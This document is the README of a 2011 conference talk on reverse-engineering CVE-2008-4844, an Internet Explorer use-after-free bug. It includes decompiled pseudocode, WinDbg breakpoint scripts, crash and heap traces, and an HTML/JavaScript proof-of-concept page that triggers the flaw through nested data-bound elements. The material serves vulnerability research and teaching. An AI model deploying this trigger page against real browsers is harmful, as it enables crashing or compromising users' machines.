```
/**************************************************************************
 * Talk:        Inception - The extended edition
 * Author:      Nelson Brito <nbrito *NoSPAM* sekure.org>
 * Conference:  Hackers to Hackers Conference Eighth Edition (October 2011)
 **************************************************************************
 *         .___                            __  .__                        *
 *         |   | ____   ____  ____ _______/  |_|__| ____   ____           *
 *         |   |/    \_/ ___\/ __ \\____ \   __\  |/  _ \ /    \          *
 *         |   |   |  \  \__\  ___/|  |_> >  | |  (  <_> )   |  \         *
 *         |___|___|__/\_____>_____>   __/|__| |__|\____/|___|__/         *
 *                                 |__|                                   *
 *                     _______________  ____ ____                         *
 *                     \_____  \   _  \/_   /_   |                        *
 *                      /  ____/  /_\  \|   ||   |                        *
 *                     /       \  \_/   \   ||   |                        *
 *                     \________\_______/___||___|                        *
 *                                                                        *
 **************************************************************************/
```
# Inception
## H2HC Eighth Edition Talk Description
_"Sometimes, the best way to advance is in reverse"_. ([Reversing: Secrest of Reverse Engineering](https://en.wikipedia.org/wiki/Reversing:_Secrets_of_Reverse_Engineering))

Every time any new vulnerability comes out we should be ready to understand it, in order to perform its exploitation or even to build defenses. [Reverse engineering](https://en.wikipedia.org/wiki/Reverse_engineering) is one of the most powerful approaches.

Many talks have been done in the last years, as well as too many useless information has been given by security community:
* Some talks have addressed particular frameworks, specific tools and a few libraries.
* No practical demonstration and/or tips and tricks regarding vulnerabilities, leaving the **black magic** hidden to the audience.

This [talk](https://github.com/nbrito/talks/blob/master/2016/ibm-systems/nbrito-inception.pdf) shares some tips and trick learned during real vulnerability reversing process, such as:
* Gathering information about the vulnerability.
* Understand the weakness type.
* Preparing the vulnerable ecosystem.
* Building a toolbox to be used.
* [Reverse engineering](https://en.wikipedia.org/wiki/Reverse_engineering) the vulnerability.
* Etc...

It shows, using very detailed [demonstration](https://vimeo.com/nbrito), how to achieve the **state-of-art** building exploitation and defenses, using your own exploitation skills.

The **black magic** is finally unveiled, showing how to use tools (public available) to understand and apply [reverse engineering](https://en.wikipedia.org/wiki/Reverse_engineering) to a vulnerability.

## Motivation
Many talks have been done in Brazil, regarding reverse engineer, as well as too much useless information:
* Mostly related to purpose-built frameworks, tools and libraries.
* Some others addressing how to translate to a readable format.
* None addressing real world vulnerabilities.

Almost all ot these talks leave both “apprentices" and security professionals in a “black hole”, with tons of misinformation. I call this deception.
The "apprentices" demand much more than simple ```hello world``` bugs, because once you have created the bug, you can exploit it easily. Take the following example:

```
; accept(SOCKET, struct sockaddr FAR*, int FAR*)
push	ebx		; ebx = int FAR*
push	esp		; esp = struct sockaddr FAR*
push	edi		; edi = SOCKET
call	_accept		; accept(edi, esp, ebx)
mov	edi, eax	; moving eax to edi
			; eax = return()
			; edi = SOCKET accept()
```
No matter what someone tries to convincing you, this is not reverse engineering... This is just a “translation”.

## Root Cause
###  ```CRecordInstance::TransferToDestination```
```
int CRecordInstance::TransferToDestination () {
    int ebp_minus_4h, eax;
    int esi, ebx = 0;
    
    esi = (sizeof(edi) >> 2) - 1;

    ebp_minus_4h = ebx;
    
    do{
        if(edi[ebx] == 0) continue;

        eax = edi[ebx]->TransferFromSrc();

        if((ebp_minus_4h == 0) && (eax != 0))
            ebp_minus_4h = eax;

        ebx++;
    }while(ebx <= esi);

    return(ebp_minus_4h);
}
````

### ```HEAP_ENTRY```
```
0:013> bc *
0:013> bp 7ea8226f ".printf \"********************************************************************************\\n\"; g"
0:013> bp 7ea8227a ".printf \"[TransferToDestination] Setting \'Array Object\': \'Array Elements\' @ EDI -> %08x[%d] = { \", edi, (poi(edi+08) >> 2); .for (r $t0 = 0 ; @$t0 <= (poi(edi+08) >> 2) - 1 ; r $t0 = @$t0 + 1) { .printf \" %08x, \", poi(poi(edi+0C)+(@$t0*4)); }; .printf \"}.\\n\"; g"
0:013> bp 7ea8227d ".printf \"[TransferToDestination] Setting \'Array.Size()\': %d (@ %08x).\\n\", esi, edi+8; g"
0:013> bp 7ea8227f ".printf \"[TransferToDestination] Setting \'Counter\': %d.\\n\", ebx; g"
0:013> bp 7ea82282 ".printf \"[TransferToDestination] Setting \'Array.Size()\': %d @ ESI.\\n\", esi; g"
0:013> bp 7ea82283 ".printf \"[TransferToDestination] Setting \'Array Index\': %d @ ESI.\\n\", esi; g"
0:013> bp 7ea82288 ".printf \"[TransferToDestination]\"; .if (ebx == 0) { .printf \" Starting \"; } .else { .printf \" Restarting \"; }; .printf \"\'Loop\': \'Counter\' is %d and \'Array Index\' is %d (@ ESI).\\n\", ebx, esi; g"
0:013> bp 7ea8228b ".printf \"[TransferToDestination] Setting \'Array[%d]\': \'Array Element\' @ %08x.\\n\", ebx, poi(eax+ebx*4); g"
0:013> bp 7ea8228f ".printf \"[TransferToDestination] Checking \'Array[%d]\': is \'Array Element\' @ %08x NULL?\\n\", ebx, poi(eax+ebx*4); g"
0:013> bp 7ea82294 ".printf \"[TransferToDestination] Calling \'Array[%d]\'->TransferFromSrc: \'Array Element\' @ %08x.\\n\", ebx, poi(eax+ebx*4); g"
0:013> bp 7ea822a7 ".printf \"[TransferToDestination] Incrementing \'Counter\': %d.\\n[TransferToDestination] Comparing \'Counter\' and \'Array Index\': \'Counter\' is %d and \'Array Index\' is %d (@ ESI).\\n\", ebx, ebx, esi; .if ((esi > (poi(edi+08) >> 2) - 1) & (ebx <= esi)) { .printf \"[TransferToDestination] Warning \'Array Index\': should be %d (@ %08x) instead of %d (@ESI).\\n\", (poi(edi+8) >> 2) - 1, edi+8, esi; g; } .else { g; }"
0:013> bp 7ea822b2 ".printf \"********************************************************************************\\n\"; g"
0:013> g
ModLoad: 76200000 76277000   C:\WINDOWS\system32\mshtmled.dll
ModLoad: 72d20000 72d29000   C:\WINDOWS\system32\wdmaud.drv
ModLoad: 72d20000 72d29000   C:\WINDOWS\system32\wdmaud.drv
ModLoad: 72d10000 72d18000   C:\WINDOWS\system32\msacm32.drv
ModLoad: 77be0000 77bf5000   C:\WINDOWS\system32\MSACM32.dll
ModLoad: 77bd0000 77bd7000   C:\WINDOWS\system32\midimap.dll
ModLoad: 68000000 68036000   C:\WINDOWS\system32\rsaenh.dll
ModLoad: 6cc60000 6cc68000   C:\WINDOWS\System32\dispex.dll
(de8.49c): Unknown exception - code 80040155 (first chance)
(de8.fe0): Unknown exception - code 80040155 (first chance)
ModLoad: 74980000 74a93000   C:\WINDOWS\System32\msxml3.dll
ModLoad: 73160000 731d7000   C:\Program Files\Common Files\System\Ole DB\oledb32.dll
ModLoad: 765b0000 765d5000   C:\WINDOWS\system32\MSDART.DLL
ModLoad: 763b0000 763f9000   C:\WINDOWS\system32\comdlg32.dll
ModLoad: 75350000 75361000   C:\Program Files\Common Files\System\Ole DB\OLEDB32R.DLL
********************************************************************************
[TransferToDestination] Setting 'Array Object': 'Array Elements' @ EDI -> 064785e0[2] = {  064788d8,  06478938, }.
[TransferToDestination] Setting 'Array.Size()': 8 (@ 064785e8).
[TransferToDestination] Setting 'Counter': 0.
[TransferToDestination] Setting 'Array.Size()': 2 @ ESI.
[TransferToDestination] Setting 'Array Index': 1 @ ESI.
[TransferToDestination] Starting 'Loop': 'Counter' is 0 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[0]': 'Array Element' @ 064788d8.
[TransferToDestination] Checking 'Array[0]': is 'Array Element' @ 064788d8 NULL?
[TransferToDestination] Calling 'Array[0]'->TransferFromSrc: 'Array Element' @ 064788d8.
ModLoad: 06b70000 06b79000   C:\WINDOWS\system32\idndl.dll
[TransferToDestination] Incrementing 'Counter': 1.
[TransferToDestination] Comparing 'Counter' and 'Array Index': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Warning 'Array Index': should be 0 (@ 064785e8) instead of 1 (@ESI).
[TransferToDestination] Restarting 'Loop': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[1]': 'Array Element' @ 06478938.
[TransferToDestination] Checking 'Array[1]': is 'Array Element' @ 06478938 NULL?
[TransferToDestination] Calling 'Array[1]'->TransferFromSrc: 'Array Element' @ 06478938.
[TransferToDestination] Incrementing 'Counter': 2.
[TransferToDestination] Comparing 'Counter' and 'Array Index': 'Counter' is 2 and 'Array Index' is 1 (@ ESI).
********************************************************************************
********************************************************************************
[TransferToDestination] Setting 'Array Object': 'Array Elements' @ EDI -> 064785e0[0] = { }.
[TransferToDestination] Setting 'Array.Size()': 0 (@ 064785e8).
[TransferToDestination] Setting 'Counter': 0.
[TransferToDestination] Setting 'Array.Size()': 0 @ ESI.
[TransferToDestination] Setting 'Array Index': -1 @ ESI.
********************************************************************************
********************************************************************************
[TransferToDestination] Setting 'Array Object': 'Array Elements' @ EDI -> 064d4c20[2] = {  06478848,  064788a8, }.
[TransferToDestination] Setting 'Array.Size()': 8 (@ 064d4c28).
[TransferToDestination] Setting 'Counter': 0.
[TransferToDestination] Setting 'Array.Size()': 2 @ ESI.
[TransferToDestination] Setting 'Array Index': 1 @ ESI.
[TransferToDestination] Starting 'Loop': 'Counter' is 0 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[0]': 'Array Element' @ 06478848.
[TransferToDestination] Checking 'Array[0]': is 'Array Element' @ 06478848 NULL?
[TransferToDestination] Calling 'Array[0]'->TransferFromSrc: 'Array Element' @ 06478848.
[TransferToDestination] Incrementing 'Counter': 1.
[TransferToDestination] Comparing 'Counter' and 'Array Index': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Warning 'Array Index': should be 0 (@ 064d4c28) instead of 1 (@ESI).
[TransferToDestination] Restarting 'Loop': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[1]': 'Array Element' @ 064788a8.
[TransferToDestination] Checking 'Array[1]': is 'Array Element' @ 064788a8 NULL?
[TransferToDestination] Calling 'Array[1]'->TransferFromSrc: 'Array Element' @ 064788a8.
[TransferToDestination] Incrementing 'Counter': 2.
[TransferToDestination] Comparing 'Counter' and 'Array Index': 'Counter' is 2 and 'Array Index' is 1 (@ ESI).
********************************************************************************
********************************************************************************
[TransferToDestination] Setting 'Array Object': 'Array Elements' @ EDI -> 064d4c20[0] = { }.
[TransferToDestination] Setting 'Array.Size()': 0 (@ 064d4c28).
[TransferToDestination] Setting 'Counter': 0.
[TransferToDestination] Setting 'Array.Size()': 0 @ ESI.
[TransferToDestination] Setting 'Array Index': -1 @ ESI.
********************************************************************************
********************************************************************************
[TransferToDestination] Setting 'Array Object': 'Array Elements' @ EDI -> 06478678[2] = {  064dc890,  064dc8f0, }.
[TransferToDestination] Setting 'Array.Size()': 8 (@ 06478680).
[TransferToDestination] Setting 'Counter': 0.
[TransferToDestination] Setting 'Array.Size()': 2 @ ESI.
[TransferToDestination] Setting 'Array Index': 1 @ ESI.
[TransferToDestination] Starting 'Loop': 'Counter' is 0 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[0]': 'Array Element' @ 064dc890.
[TransferToDestination] Checking 'Array[0]': is 'Array Element' @ 064dc890 NULL?
[TransferToDestination] Calling 'Array[0]'->TransferFromSrc: 'Array Element' @ 064dc890.
[TransferToDestination] Incrementing 'Counter': 1.
[TransferToDestination] Comparing 'Counter' and 'Array Index': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Warning 'Array Index': should be 0 (@ 06478680) instead of 1 (@ESI).
[TransferToDestination] Restarting 'Loop': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[1]': 'Array Element' @ 064dc8f0.
[TransferToDestination] Checking 'Array[1]': is 'Array Element' @ 064dc8f0 NULL?
[TransferToDestination] Calling 'Array[1]'->TransferFromSrc: 'Array Element' @ 064dc8f0.
[TransferToDestination] Incrementing 'Counter': 2.
[TransferToDestination] Comparing 'Counter' and 'Array Index': 'Counter' is 2 and 'Array Index' is 1 (@ ESI).
********************************************************************************
********************************************************************************
[TransferToDestination] Setting 'Array Object': 'Array Elements' @ EDI -> 06478678[0] = { }.
[TransferToDestination] Setting 'Array.Size()': 0 (@ 06478680).
[TransferToDestination] Setting 'Counter': 0.
[TransferToDestination] Setting 'Array.Size()': 0 @ ESI.
[TransferToDestination] Setting 'Array Index': -1 @ ESI.
********************************************************************************
********************************************************************************
[TransferToDestination] Setting 'Array Object': 'Array Elements' @ EDI -> 06483be0[2] = {  0648b4d0,  064d4c28, }.
[TransferToDestination] Setting 'Array.Size()': 8 (@ 06483be8).
[TransferToDestination] Setting 'Counter': 0.
[TransferToDestination] Setting 'Array.Size()': 2 @ ESI.
[TransferToDestination] Setting 'Array Index': 1 @ ESI.
[TransferToDestination] Starting 'Loop': 'Counter' is 0 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[0]': 'Array Element' @ 0648b4d0.
[TransferToDestination] Checking 'Array[0]': is 'Array Element' @ 0648b4d0 NULL?
[TransferToDestination] Calling 'Array[0]'->TransferFromSrc: 'Array Element' @ 0648b4d0.
[TransferToDestination] Incrementing 'Counter': 1.
[TransferToDestination] Comparing 'Counter' and 'Array Index': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Warning 'Array Index': should be 0 (@ 06483be8) instead of 1 (@ESI).
[TransferToDestination] Restarting 'Loop': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[1]': 'Array Element' @ 064d4c28.
[TransferToDestination] Checking 'Array[1]': is 'Array Element' @ 064d4c28 NULL?
[TransferToDestination] Calling 'Array[1]'->TransferFromSrc: 'Array Element' @ 064d4c28.
[TransferToDestination] Incrementing 'Counter': 2.
[TransferToDestination] Comparing 'Counter' and 'Array Index': 'Counter' is 2 and 'Array Index' is 1 (@ ESI).
********************************************************************************
********************************************************************************
[TransferToDestination] Setting 'Array Object': 'Array Elements' @ EDI -> 06483be0[0] = { }.
[TransferToDestination] Setting 'Array.Size()': 0 (@ 06483be8).
[TransferToDestination] Setting 'Counter': 0.
[TransferToDestination] Setting 'Array.Size()': 0 @ ESI.
[TransferToDestination] Setting 'Array Index': -1 @ ESI.
********************************************************************************
********************************************************************************
[TransferToDestination] Setting 'Array Object': 'Array Elements' @ EDI -> 064e04f8[2] = {  064e1650,  064e16b0, }.
[TransferToDestination] Setting 'Array.Size()': 8 (@ 064e0500).
[TransferToDestination] Setting 'Counter': 0.
[TransferToDestination] Setting 'Array.Size()': 2 @ ESI.
[TransferToDestination] Setting 'Array Index': 1 @ ESI.
[TransferToDestination] Starting 'Loop': 'Counter' is 0 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[0]': 'Array Element' @ 064e1650.
[TransferToDestination] Checking 'Array[0]': is 'Array Element' @ 064e1650 NULL?
[TransferToDestination] Calling 'Array[0]'->TransferFromSrc: 'Array Element' @ 064e1650.
[TransferToDestination] Incrementing 'Counter': 1.
[TransferToDestination] Comparing 'Counter' and 'Array Index': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Warning 'Array Index': should be 0 (@ 064e0500) instead of 1 (@ESI).
[TransferToDestination] Restarting 'Loop': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[1]': 'Array Element' @ 064e16b0.
[TransferToDestination] Checking 'Array[1]': is 'Array Element' @ 064e16b0 NULL?
[TransferToDestination] Calling 'Array[1]'->TransferFromSrc: 'Array Element' @ 064e16b0.
[TransferToDestination] Incrementing 'Counter': 2.
[TransferToDestination] Comparing 'Counter' and 'Array Index': 'Counter' is 2 and 'Array Index' is 1 (@ ESI).
********************************************************************************
********************************************************************************
[TransferToDestination] Setting 'Array Object': 'Array Elements' @ EDI -> 064e04f8[0] = { }.
[TransferToDestination] Setting 'Array.Size()': 0 (@ 064e0500).
[TransferToDestination] Setting 'Counter': 0.
[TransferToDestination] Setting 'Array.Size()': 0 @ ESI.
[TransferToDestination] Setting 'Array Index': -1 @ ESI.
********************************************************************************
********************************************************************************
[TransferToDestination] Setting 'Array Object': 'Array Elements' @ EDI -> 064d5aa8[2] = {  064d30e0,  064d3140, }.
[TransferToDestination] Setting 'Array.Size()': 8 (@ 064d5ab0).
[TransferToDestination] Setting 'Counter': 0.
[TransferToDestination] Setting 'Array.Size()': 2 @ ESI.
[TransferToDestination] Setting 'Array Index': 1 @ ESI.
[TransferToDestination] Starting 'Loop': 'Counter' is 0 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[0]': 'Array Element' @ 064d30e0.
[TransferToDestination] Checking 'Array[0]': is 'Array Element' @ 064d30e0 NULL?
[TransferToDestination] Calling 'Array[0]'->TransferFromSrc: 'Array Element' @ 064d30e0.
[TransferToDestination] Incrementing 'Counter': 1.
[TransferToDestination] Comparing 'Counter' and 'Array Index': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Warning 'Array Index': should be 0 (@ 064d5ab0) instead of 1 (@ESI).
[TransferToDestination] Restarting 'Loop': 'Counter' is 1 and 'Array Index' is 1 (@ ESI).
[TransferToDestination] Setting 'Array[1]': 'Array Element' @ 064d3140.
[TransferToDestination] Checking 'Array[1]': is 'Array Element' @ 064d3140 NULL?
[TransferToDestination] Calling 'Array[1]'->TransferFromSrc: 'Array Element' @ 064d3140.
(de8.fe0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=06d8fca8 ebx=000c0000 ecx=000c0000 edx=7e90876d esi=064d3140 edi=00000000
eip=7ea814a1 esp=06d8fc8c ebp=06d8fc8c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
mshtml!CXferThunk::PvInitVar+0x5:
7ea814a1 ff7118          push    dword ptr [ecx+18h]  ds:0023:000c0018=????????
0:018> !address 064d3140
	06430000 : 06430000 - 000c6000
					Type     00020000 MEM_PRIVATE
					Protect  00000004 PAGE_READWRITE
					State    00001000 MEM_COMMIT
					Usage    RegionUsageHeap
					Handle   00140000
0:018> !heap -p -a 064d3140
	address 064d3140 found in
	_HEAP @ 140000
	  HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
		064d3110 000c 0000  [07]   064d3118    00048 - (busy)
		  mshtml!CImgCtx::`vftable'
		Trace: 680d
		7c96cf9a ntdll!RtlDebugAllocateHeap+0x000000e1
		7c949564 ntdll!RtlAllocateHeapSlowly+0x00000044
		7c918f01 ntdll!RtlAllocateHeap+0x00000e64
		7e8db4e0 mshtml!_MemAllocClear+0x00000023
		7e86fda7 mshtml!CImgInfo::NewDwnCtx+0x0000000c
		7e8591ce mshtml!NewDwnCtx+0x00000028
		7e859680 mshtml!CDoc::NewDwnCtx2+0x0000014e
		7e8593b0 mshtml!CDoc::NewDwnCtx+0x00000057
		7e85bb7d mshtml!CImgHelper::FetchAndSetImgCtx+0x0000005b
		7e85bb18 mshtml!CImgHelper::SetImgSrc+0x00000023
		7e886855 mshtml!CImgHelper::EnterTree+0x00000127
		7e8867a3 mshtml!CImgHelper::Notify+0x000001b6
		7e8cf890 mshtml!CImgElement::Notify+0x0000002c
		7e8ab94a mshtml!CSpliceTreeEngine::InsertSplice+0x00000a09
		7e8a99e7 mshtml!CMarkup::SpliceTreeInternal+0x000000ac
		7e8aa8ba mshtml!CDoc::CutCopyMove+0x000000d8
		7e8aac2b mshtml!CDoc::Move+0x00000018
		7e8ad44d mshtml!HandleHTMLInjection+0x00000187
		7e8ad2d9 mshtml!HandleHTMLInjection+0x00000050
		7e8aae80 mshtml!CElement::Inject+0x000002ee
		7ea66c1f mshtml!CDBindMethodsText::BoundValueToElement+0x00000022
		7ea81d85 mshtml!CXfer::TransferFromSrc+0x000000c5
		7ea82299 mshtml!CRecordInstance::TransferToDestination+0x0000002a
		7ea82870 mshtml!CRecordInstance::SetHRow+0x00000045
		7ea82fb8 mshtml!CCurrentRecordInstance::OnRowPositionChange+0x0000005d
		7317f285 oledb32!CRowPosition::FireRowPositionChange+0x00000096
		7317f81d oledb32!CRowPosition::SetRowPosition+0x00000117
		7ea831f5 mshtml!CCurrentRecordInstance::InitCurrentRow+0x0000007b
		7ea83373 mshtml!CCurrentRecordInstance::InitPosition+0x00000013
		7e9e17bc mshtml!CDataBindTask::DecideToRun+0x0000012d
		7ea800f2 mshtml!CDataBindTask::OnRun+0x000000ea
		7e967f2b mshtml!CTask::TaskmanRunTask+0x0000003e
```
For further information, please, refer to this [link](https://github.com/nbrito/research/tree/master/inception/reversing).

## [CVE-2008-4844](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4844) Description
After three years, the [CVE Board](http://cve.mitre.org/community/board/index.html) has decided to change the description for [CVE-2008-4844](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4844) based on this research. As a direct result, the [CVE-2008-4844](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4844) is much more accurate than before. Check by yourself...
### Previous
_Use-after-free vulnerability in ```mshtml.dll``` in Microsoft Internet Explorer 5.01, 6, and 7 on Windows XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, and Server 2008 allows remote attackers to execute arbitrary code via a crafted XML document containing nested ```SPAN``` elements, as exploited in the wild in December 2008._
### Current
_Use-after-free vulnerability in the ```CRecordInstance::TransferToDestination``` function in ```mshtml.dll``` in Microsoft Internet Explorer 5.01, 6, 6 SP1, and 7 allows remote attackers to execute arbitrary code via DSO bindings involving (1) an XML Island, (2) XML DSOs, or (3) Tabular Data Control (TDC) in a crafted HTML or XML document, as demonstrated by nested ```SPAN``` or ```MARQUEE``` elements, and exploited in the wild in December 2008._
### Suggested
_Internet Explorer 5.01, 6, 7, 8 Beta-1 and Beta-2 use-after-free condition within ```MSHTML.DLL```, due to ```CRecordInstance::TransferToDestination()``` while checking for ```CXfer``` array size, allows remote code execution via crafted HTML document using (**multiple**) nested HTML Bindable Elements referring to predefined Data Source Object (XML Island, XML DSOs or Tabular Data Control)._

By "_using (**multiple**) nested HTML Bindable Elements_" I meant that the ```DIV```, ```LABEL```, ```FIELDSET+LEGEND```, ```MARQUEE``` and ```SPAN``` HTML Elements can also be used to reproduce the vulnerability, and they do not even need to be the same, they can be mixed, for example:
```
<HTML>
<SCRIPT LANGUAGE="JavaScript">
function Inception (){
	document.getElementById("b00m").innerHTML =
		"<XML ID=I>" +
		"<X>" +
		"<C>" +
		"&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;" +
		"</C>" +
		"</X>" +
		"</XML>" +
		"<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>" +
		"<DIV DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>" +
		"</DIV>" +
		"</SPAN>";
}
</SCRIPT>
<BODY onLoad="Inception();">
<DIV ID="b00m" STYLE="display: none;">
</DIV>
</BODY>
</HTML>
```
Researchers know how hard is to change vulnerabilities description, and I really apreciate the changes...

Here is the [CVE Change Logs](https://cassandra.cerias.purdue.edu/CVE_changes/), and here is the [CVE Change Log](https://cassandra.cerias.purdue.edu/CVE_changes/CVE.2011.12.html) for modified [CVE-2008-4844](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4844) entry ([December 21, 2011](https://cassandra.cerias.purdue.edu/CVE_changes/CVE.2011.12.html)).

For further information, please, refer to this [link](https://github.com/nbrito/research/tree/master/pop/html/ips-bypass-test-bed).

## Credits
[Nelson Brito](mailto:nbrito@sekure.org)

## Disclaimer
Codes are available for research purposes only, and I vehemently deny the malicious use, as well as the illegal purpose use, of any information, code and/or tool contained on this repository.

If you think there is any information, code and/or tool that should not be here, please, [let me know](mailto:nbrito@sekure.org).

## Warning
This repository does not provide you with any legal rights to any intellectual property in any information, code and/or tool, also, be aware that the use of some information, code and/or tool may be forbidden in some countries, and there may be rules and laws prohibiting any unauthorized user from use the information, code and/or tool, being these actions considered illegal.
